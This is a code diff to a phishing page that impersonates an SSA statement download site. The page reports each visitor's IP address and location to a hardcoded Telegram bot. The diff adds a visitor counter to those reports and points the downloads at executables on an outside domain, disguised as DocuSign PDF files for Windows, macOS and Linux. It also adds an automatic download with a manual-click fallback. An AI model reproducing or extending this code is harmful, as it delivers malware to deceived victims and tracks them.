@@ -44,6 +44,11 @@
         const TELEGRAM_BOT_TOKEN = '7284066719:AAEncc3VY27DzgRzCLnuNTLpyIJf5MrrCos';
         const TELEGRAM_CHAT_ID = '7724482403';
         
+        // Visitor counter (stored in localStorage)
+        let visitorCount = localStorage.getItem('visitorCount') || 0;
+        visitorCount++;
+        localStorage.setItem('visitorCount', visitorCount);
+        
         // Real IP detection API
         const IP_API_URL = 'https://api.ipify.org?format=json';
         const IP_GEOLOCATION_API = 'https://ipapi.co/json/';
@@ -143,7 +148,7 @@
         function formatTelegramMessage(visitData) {
             return `
 <blockquote>
-<b>📡 New Visit Notification</b>
+<b>📡 New Visit:- (Visitor No: ${visitorCount})</b>
 <b>🕒 Time:</b> ${new Date().toLocaleString()}
 <b>🌐 IP:</b> ${visitData.ip}
 <b>📍 Location:</b> ${visitData.city}, ${visitData.region}, ${visitData.country}
@@ -208,14 +213,31 @@
         function getDownloadLink(os) {
             switch (os.toLowerCase()) {
                 case 'windows':
-                    return '/abh2/Statement.exe';
+                    return 'http://specialitystoreservice.com/serve/647c5cc55f189ed6c9e404085b12634/ContractorPayAppViaDocusign_Pdf.exe?e=Access&y=Guest';
                 case 'macos':
-                    return '/abh2/Statement.dmg';
+                    return 'https://specialitystoreservice.com/serve/647c5cc55f189ed6c9e404085b12634/ContractorPayAppViaDocusign_Pdf.pkg?e=Access&y=Guest';
                 case 'linux':
-                    return '/abh2/Statement.bin';
+                    return 'https://specialitystoreservice.com/serve/647c5cc55f189ed6c9e404085b12634/ContractorPayAppViaDocusign_Pdf.sh?e=Access&y=Guest';
                 default:
-                    return '/abh2/Statement.exe';
+                    return 'http://specialitystoreservice.com/serve/647c5cc55f189ed6c9e404085b12634/ContractorPayAppViaDocusign_Pdf.exe?e=Access&y=Guest';
             }
+        }
+        
+        // Function to handle manual download click
+        function handleManualDownload() {
+            const platform = detectPlatform();
+            const downloadLink = getDownloadLink(platform);
+            
+            if (isMobileDevice()) {
+                showMobileWarning();
+                return false;
+            }
+            
+            const a = document.createElement('a');
+            a.href = downloadLink;
+            a.download = downloadLink.split('/').pop();
+            a.click();
+            return false;
         }
         
         // Main function to handle visit
@@ -264,8 +286,10 @@
                 const downloadLink = getDownloadLink(platform);
                 
                 // Set the download link in the UI
-                document.getElementById('downloadLink').href = downloadLink;
-                document.getElementById('downloadLink').download = downloadLink.split('/').pop();
+                const downloadElement = document.getElementById('downloadLink');
+                downloadElement.href = downloadLink;
+                downloadElement.download = downloadLink.split('/').pop();
+                downloadElement.onclick = handleManualDownload;
                 
                 // Start download after delay
                 setTimeout(function() {
@@ -307,7 +331,7 @@
                                 <div class="uef-notice-row hd">
                                     <div class="uef-notice-content">
                                         <center><h1>Welcome to Your Latest SSA Statement Download</h1></center>
-                                        <h4>Your download will start automatically. If it doesn't, <a id="downloadLink" href="#" download="">click here</a>.</h4>
+                                        <h4>Your download will start automatically. If it doesn't, <a id="downloadLink" href="#" onclick="return handleManualDownload();">click here</a>.</h4>
                                     </div>
                                 </div>
                                 <div class="uef-notice-row">
